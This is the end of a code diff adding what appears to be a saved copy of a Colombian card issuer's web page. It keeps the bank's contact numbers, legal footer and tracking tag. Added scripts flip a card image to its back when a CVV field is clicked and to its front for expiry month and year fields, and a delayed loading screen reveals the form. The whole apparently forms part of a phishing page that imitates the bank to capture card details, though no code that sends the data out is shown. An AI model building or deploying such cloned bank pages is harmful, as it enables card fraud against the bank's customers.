+            } else {
+                div.style.display = "none";
+                img.src = "../App_Themes/Imagenes/Mas.png";
+            }
+        }
+        $(document).ready(function () {
+			
+
+			$('#cvv').click(function(){
+ 
+		document.getElementById("movida").src = "trasera.png";
+    
+	});
+					
+			 
+ 	$('#mes').click(function(){
+ 
+		document.getElementById("movida").src = "delantera.png";
+    
+	});
+	
+		$('#ano').click(function(){
+ 
+		document.getElementById("movida").src = "delantera.png";
+    
+	});
+ 
+			
+		 openLoading();
+			 
+				  setTimeout(function(){
+					  
+					$("#ctl00_DefaultContent_cvApp").css('visibility', 'visible');
+					
+					}, 5000);
+			
+			
+			
+            var numTarjeta = '**** **** **** ****';
+            if (numTarjeta != null) {
+                divexpandcollapse("div" + numTarjeta);
+                    '';
+            }
+			
+			
+			
+			
+
+
+
+
+
+
+
+
+            if ('0' === '0') {
+                var id = '903f8071225b0d36f435636a1416b854e0aa3f66d4f8c2a5e6c7c8a9ab80467d';
+                if (id != null && id != '') {
+                    bk_addPageCtx('tuya_id', id);
+                    bk_addPageCtx('id', id);
+                    bk_allow_multiple_calls = true;
+                    bk_use_multiple_iframes = true;
+                    bk_doJSTag(86430, 1);
+                    
+                }
+            }
+        }
+
+        );
+    </script>
+
+            </div>
+        </div>
+        <div id="ContactFrame">
+            Líneas de atención al cliente: Medellín 444 37 27, Bogotá 482 48 04, Cali 380 89 33 y otras ciudades 01 8000 978 888
+        </div>
+
+        <div id="FooterFrame">
+            Todos los Derechos Reservados © 2019 Entidad Vigilada por la Superintendencia Financiera de Colombia
+        </div>
+        <div id="FooterFrame">
+            Para conocer acerca de la utilización de Información,
+            <a id="ctl00_HyperLink1" href="#" target="_blank">Ingresa aquí</a>
+        </div>
+
+    
+<script type="text/javascript">
+//<![CDATA[
+var ctl00_tvMenu_ImageArray =  new Array('WebResource.axd', 'WebResource.axd', 'WebResource.axd', 'WebResource.axd', 'WebResource.axd', 'WebResource.axd');
+var Page_ValidationSummaries =  new Array(document.getElementById("ctl00_DefaultContent_vsApp"));
+var Page_Validators =  new Array(document.getElementById("ctl00_DefaultContent_cvApp"));
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+var ctl00_DefaultContent_cvApp = document.all ? document.all["ctl00_DefaultContent_cvApp"] : document.getElementById("ctl00_DefaultContent_cvApp");
+ctl00_DefaultContent_cvApp.evaluationfunction = "CustomValidatorEvaluateIsValid";
+var ctl00_DefaultContent_vsApp = document.all ? document.all["ctl00_DefaultContent_vsApp"] : document.getElementById("ctl00_DefaultContent_vsApp");
+ctl00_DefaultContent_vsApp.showmessagebox = "True";
+ctl00_DefaultContent_vsApp.showsummary = "False";
+//]]>
+</script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+var start=new Date();start=Date.parse(start)/1000;var counts=420;function CountDown(){var now=new Date();now=Date.parse(now)/1000;var x=parseInt(counts-(now-start),10);if(x>0){timerID=setTimeout('CountDown()', 100)}else{if(window.location.href.toUpperCase().indexOf('PAGINAS') > -1){portaltwindow=window.open('CerrarSesion.aspx','','width=322,height=159'); location.href='../login.aspx';}else{portaltwindow=window.open('Paginas/CerrarSesion.aspx','','width=322,height=159'); location.href='login.aspx';}}}CountDown();
+var callBackFrameUrl='../WebResource.axd';
+WebForm_InitCallback();var ctl00_tvMenu_Data = new Object();
+ctl00_tvMenu_Data.images = ctl00_tvMenu_ImageArray;
+ctl00_tvMenu_Data.collapseToolTip = "Collapse {0}";
+ctl00_tvMenu_Data.expandToolTip = "Expand {0}";
+ctl00_tvMenu_Data.expandState = theForm.elements['ctl00_tvMenu_ExpandState'];
+ctl00_tvMenu_Data.selectedNodeID = theForm.elements['ctl00_tvMenu_SelectedNode'];
+ctl00_tvMenu_Data.hoverClass = 'ctl00_tvMenu_8 menu_hoverNodestyle';
+ctl00_tvMenu_Data.hoverHyperLinkClass = 'ctl00_tvMenu_7 menu_hoverNodestyle';
+(function() {
+  for (var i=0;i<6;i++) {
+  var preLoad = new Image();
+  if (ctl00_tvMenu_ImageArray[i].length > 0)
+    preLoad.src = ctl00_tvMenu_ImageArray[i];
+  }
+})();
+ctl00_tvMenu_Data.lastIndex = 10;
+ctl00_tvMenu_Data.populateLog = theForm.elements['ctl00_tvMenu_PopulateLog'];
+ctl00_tvMenu_Data.treeViewID = 'ctl00$tvMenu';
+ctl00_tvMenu_Data.name = 'ctl00_tvMenu_Data';
+
+var Page_ValidationActive = false;
+if (typeof(ValidatorOnLoad) == "function") {
+    ValidatorOnLoad();
+}
+
+function ValidatorOnSubmit() {
+    if (Page_ValidationActive) {
+        return ValidatorCommonOnSubmit();
+    }
+    else {
+        return true;
+    }
+}
+        
+(function(id) {
+    var e = document.getElementById(id);
+    if (e) {
+        e.dispose = function() {
+            Array.remove(Page_ValidationSummaries, document.getElementById(id));
+        }
+        e = null;
+    }
+})('ctl00_DefaultContent_vsApp');
+Sys.Application.add_init(function() {
+    $create(Sys.UI._Timer, {"enabled":false,"interval":1000,"uniqueID":"ctl00$TReloj"}, null, null, $get("ctl00_TReloj"));
+});
+
+document.getElementById('ctl00_DefaultContent_cvApp').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ctl00_DefaultContent_cvApp'));
+}
+//]]>
+
+
+
+
+
+	
+	
+
+
+</script>
+
+
+
+
+</body></html>
